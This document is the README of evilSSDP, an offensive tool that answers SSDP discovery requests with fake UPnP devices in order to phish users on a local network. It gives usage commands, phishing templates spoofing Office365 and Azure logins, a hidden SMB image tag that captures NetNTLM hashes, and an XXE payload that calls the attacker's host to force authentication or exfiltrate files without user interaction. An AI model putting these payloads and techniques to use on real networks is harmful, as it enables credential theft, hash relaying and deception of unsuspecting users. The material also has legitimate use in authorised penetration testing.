# Overview
This tool responds to SSDP multicast discover requests, posing as a generic UPNP device on a local network. Your spoofed device will magically appear in Windows Explorer on machines in your local network. Users who are tempted to open the device are shown a configurable webpage. By default, this page will load a hidden image over SMB, allowing you to capture or relay the NetNTLM challenge/response.

Templates are also provided to capture clear-text credentials via basic authentication and logon forms, and creating your own custom templates is quick and easy.

This works against all modern Operating Systems (including Windows 10 even if they have disabled NETBIOS and LLMNR) and requires no existing credentials to execute.

![Demo Video](ssdp.mp4)

As a bonus, this tool can also detect and exploit potential zero-day vulnerabilities in the XML parsing engines of applications using SSDP/UPNP. To try this, use the 'xxe-smb' template. If a vulnerable device is found, it will alert you in the UI and then mount your SMB share with NO USER INTERACTION required via an XML External Entity (XXE) attack. 

# Usage
The most basic run looks like this:

```
essdp.py eth0
```

You need to provide the network interface at a minimum. The interface is used for both the UDP SSDP interaction as well as hosting a web server for the XML files and phishing page. The port is used only for the web server and defaults to 8888.

The tool will automatically inject an IMG tag into the phishing page using the IP of the interface you provide. To work with hashes, you'll need to launch an SMB server at that interface (like Impacket). This address can be customized with the `-s` option. 

You do NOT need to edit the variables in the template files - the tool will do this automatically.

You can choose between the included templates in the "templates" folder or build your own simply by duplicating an existing folder and editing the files inside. This allows you to customize the device name, the phishing contents page, or even build a totally new type of UPNP device that I haven't created yet.

Some example scenarios:

```
# Use wlan0 for device advertisement and phishing, capturing NetNTLM and hoping for clear-text with Office365 spoof:
essdp.py wlan0 -t office365

# Same as above, but assuming your SMB server is running on another IP:
essdp.py wlan0 -t office365 -s 192.168.1.205

# Prompt for creds using basic auth and redirect to Azure:
essdp.py wlan0 -t microsoft-azure -u 'https://azure.microsoft.com/auth/signin/' -b

# Hope for an XXE vul to capture NetNTLM while Impacket/Responder is running on wlan0:
essdp.py wlan0 -t xxe-smb
```

Full usage details:

```
usage: essdp.py [-h] [-p PORT] [-t TEMPLATE] [-s SMB] [-b] [-r REALM] [-u URL]
                interface

positional arguments:
  interface             Network interface to listen on.

optional arguments:
  -h, --help            show this help message and exit
  -p PORT, --port PORT  Port for HTTP server. Defaults to 8888.
  -t TEMPLATE, --template TEMPLATE
                        Name of a folder in the templates directory. Defaults
                        to "password-vault". This will determine xml and
                        phishing pages used.
  -s SMB, --smb SMB     IP address of your SMB server. Defalts to the primary
                        address of the "interface" provided.
  -b, --basic           Enable base64 authentication for templates and write
                        credentials to creds.txt
  -r REALM, --realm REALM
                        Realm to appear when prompting users for
                        authentication via base64 auth.
  -u URL, --url URL     Add javascript to the template to redirect from the
                        phishing page to the provided URL.
```

# Templates
The following templates come with the tool. If you have good design skills, please contribute one of your own!

- `office365`:          Will show up in Windows Explorer as "Office365 Backups". Will send to a nice looking phishing page that will POST credentials back. These will be flagged in the UI and logged in the log file. Will redirect back to the phishing page after POST. Future improvement might be to redirect to actual Office365. Developer: [pentestgeek](https://github.com/pentestgeek/phishing-frenzy-templates).
- `microsft-azure`:     Will appear in Windows Explorer as "Microsoft Azure Storage". Landing page is the Windows Live login page when cookies are disabled. Recommend to use with the -u option to redirect users to real login page. Developer: [Dwight Hohnstein](https://github.com/djhohnstein).
- `bitcoin`:            Will show up in Windows Explorer as "Bitcoin Wallet". Phishing page is just a random set of Bitcoin private/public/address info. There are no actual funds in these accounts.
- `password-vault`:     Will show up in Windows Explorer as "IT Password Vault". Phishing page contains a short list of fake passwords / ssh keys / etc.
- `xxe-smb`:            Will not likely show up in Windows Explorer. Used for finding zero day vulnerabilities in XML parsers. Will trigger an "XXE - VULN" alert in the UI for hits and will attempt to force clients to authenticate with the SMB server, with 0 interaction.
- `xxe-exfil`:          Another example of searching for XXE vulnerabilities, but this time attempting to exfiltrate a test file from a Windows host. Of course you can customize this to look for whatever specific file you are after, Windows or Linux. In the vulnerable applications I've discovered, exfiltration works only on a file with no whitepace or linebreaks. This is due to how it is injected into the URL of a GET request. If you get this working on multi-line files, PLEASE let me know how you did it.

Creating your own templates is easy. Simply copy the folder of an existing template and edit the following files:
- `device.xml`:         Here is where you will define what the device looks like inside Windows Explorer.
- `present.html`:       This is the phishing page displayed when a target opens the evil device. Craft anything you like here. Note that Python's string template will parse this, so you will need to use `$$` in place of `$` anywhere to escape the template engine.
- `service.xml`:        Not yet implemented. May be needed for more complex UPNP spoofing in the future.

In your phishing page (`present.html`), use variables like the following for additional functionality:

```
# The following line will initiate a NetNTLM challenge/response using the IP address of either the interface you provide or an optionally specified IP address:
<img src="file://///$smbServer/smb/hash.jpg" style="display: none;" />

# The following line will leverage an optionally specified URL redirection. This is handy for when used with optional basic authentication to then redirect to a valid site. This line is built in to the microsoft-azure template
<img src="file://///$smbServer/smb/hash.jpg" style="display: none;" />

# If using an HTTP form to capture clear-text credentials, use code like the following. The tool will monitor POSTs to this URL for credentials:
<form method="POST" action="/ssdp/do_login.html" name="LoginForm" autocomplete="off">
```

# Technical Details
Simple Service Discovery Protocol (SSDP) is used by Operating Systems (Windows, MacOS, Linux, IOS, Android, etc) and applications (Spotify, Youtube, etc) to discover shared devices on a local network. It is the foundation for discovering and advertising Universal Plug & Play (UPNP) devices.

Devices attempting to discover shared network resources will send a UDP multicast out to 239.255.255.250 on port 1900. The source port is randomized. An example request looks like this:
```
M-SEARCH * HTTP/1.1
Host: 239.255.255.250:1900
ST: upnp:rootdevice
Man: "ssdp:discover"
MX: 3
```

To interact with this host, we need to capture both the source port and the 'ST' (Service Type) header. The response MUST be sent to the correct source port and SHOULD include the correct ST header. Note that it is not just the Windows OS looking for devices - scanning a typical network will show a large amount of requests from applications inside the OS (like Spotify), mobile phones, and other media devices. Windows will only play ball if you reply with the correct ST, other sources are more lenient.

evilSSDP will extract the requested ST and send a reponse like the following:

```
HTTP/1.1 200 OK
CACHE-CONTROL: max-age=1800
DATE: Tue, 26 Jun 2018 01:06:26 GMT
EXT: 
LOCATION: http://192.168.1.131:8888/ssdp/device-desc.xml
SERVER: Linux/3.10.96+, UPnP/1.0, eSSDP/0.1
ST: upnp:rootdevice
USN: uuid:e415ce0a-3e62-22d0-ad3f-42ec42e36563:upnp-rootdevice
BOOTID.UPNP.ORG: 0
CONFIGID.UPNP.ORG: 1
```

The location IP, ST, and date are constructed dynamically. This tells the requestor where to find more information about our device. Here, we are forcing Windows (and other requestors) to access our 'Device Descriptor' xml file and parse it. The USN is just a random string and needs only to be unique and formatted properly.

evilSSDP will pull the 'device.xml' file from the chosen templates folder and dynamically plug in some variables such as your IP address. This 'Device Descriptor' file is where you can customize some juicy-sounding friendly names and descriptions. It looks like this:

```
<root>
    <specVersion>
        <major>1</major>
        <minor>0</minor>
    </specVersion>
    <device>
        <deviceType>urn:schemas-upnp-org:device:Basic:1</deviceType>
        <friendlyName>IT Password Vault</friendlyName>
        <manufacturer>PasSecure</manufacturer>
        <manufacturerURL>http://passecure.com</manufacturerURL>
        <modelDescription>Corporate Password Repository</modelDescription>
        <modelName>Core</modelName>
        <modelNumber>1337</modelNumber>
        <modelURL>http://passsecure.com/1337</modelURL>
        <serialNumber>1337</serialNumber>
        <UDN>uuid:e415ce0a-3e62-22d0-ad3f-42ec42e36563</UDN>
        <serviceList>
            <service>
                <URLBase>http://$localIp:$localPort</URLBase>
                <serviceType>urn:ecorp.co:service:ePNP:1</serviceType>
                <serviceId>urn:epnp.ecorp.co:serviceId:ePNP</serviceId>
                <controlURL>/epnp</controlURL>
                <eventSubURL/>
                <SCPDURL>/service-desc.xml</SCPDURL>
            </service>
        </serviceList>
        <presentationURL>http://$localIp:$localPort/present.html</presentationURL>
        </device>
    </root>

```

A key line in this file contains the 'Presentation URL'. This is what will load in a user's browser if they decide to manually double-click on the UPNP device. evilSSDP will host this file automatically (present.html from the chosen template folder), plugging in your source IP address into an IMG tag to access an SMB share that you can host with tools like [Impacket](https://www.coresecurity.com/corelabs-research/open-source-tools/impacket), [Responder](https://github.com/SpiderLabs/Responder), or [Metasploit](https://www.rapid7.com/db/modules/auxiliary/server/capture/smb).

The IMG tage looks like this:

```
<img src="file://///$localIp/smb/hash.jpg" style="display: none;" /><br>
```

# Zero-Day Hunting
By default, this tool essentially forces devices on the network to parse an XML file. A well-known attack against applications that parse XML exists - [XML External Entity Processing (XXE)](https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing).

This type of attack against UPNP devices in likely overlooked - simply because the attack method is complex and not readily apparent. However, evilSSDP makes it very easy to test for vulnerable devices on your network. Simply run the tool and look for a big `[XXE VULN!!!]` in the output. NOTE: using the xxe template will likely not spawn visibile evil devices across the LAN, it is meant only for zero-interaction scenarios.

This is accomplished by providing a Device Descriptor XML file with the following content:

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ 
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file://///$smbServer/smb/hash.jpg" >
<!ENTITY xxe-url SYSTEM "http://$localIp:$localPort/ssdp/xxe.html" >
]>
<hello>&xxe;&xxe-url;</hello>
```

When a vulnerable XML parser reads this file, it will automatically mount the SMB share (allowing you to crack the hash or relay) as well as access an HTTP URL to notify you it was discovered. The notification will contain the HTTP headers and an IP address, which should give you some info on the vulnerable application. If you see this, please do contact the vendor to fix the issue. Also, I would love to hear about any zero days you find using the tool. And please do mention the tool in your CVE.

# Customization
This is an early beta, but constructed in such a way to allow easy template creation in the future. I've included two very basic templates - simply duplicate a template folder and customize for your own use. Then use the '-t' parameter to choose your new template.

The tool currently only correctly creates devices for the UPNP 'rootdevice' device type, although it is responding to the SSDP queries for all devices types. If you know UPNP well, you can create a new template with the correct parameters to fufill requests for other device types as well.

# Thanks
Thanks to ZeWarren and his project [here](https://github.com/ZeWaren/python-upnp-ssdp-example). I used this extensively to understand how to get the basics for SSDP working.
Thanks to the pentest geek and their phishing templates [here](https://github.com/pentestgeek/phishing-frenzy-templates). I used the Office365 login page from there.
Thanks to [Dwight Hohnstein](https://github.com/djhohnstein) for his great work to implement cool features like basic authentication, realm support, and automatic redirection in evilSSDP. He kindly wrote and provided code to make this work.

Also thanks to Microsoft for developing lots of fun insecure things to play with.
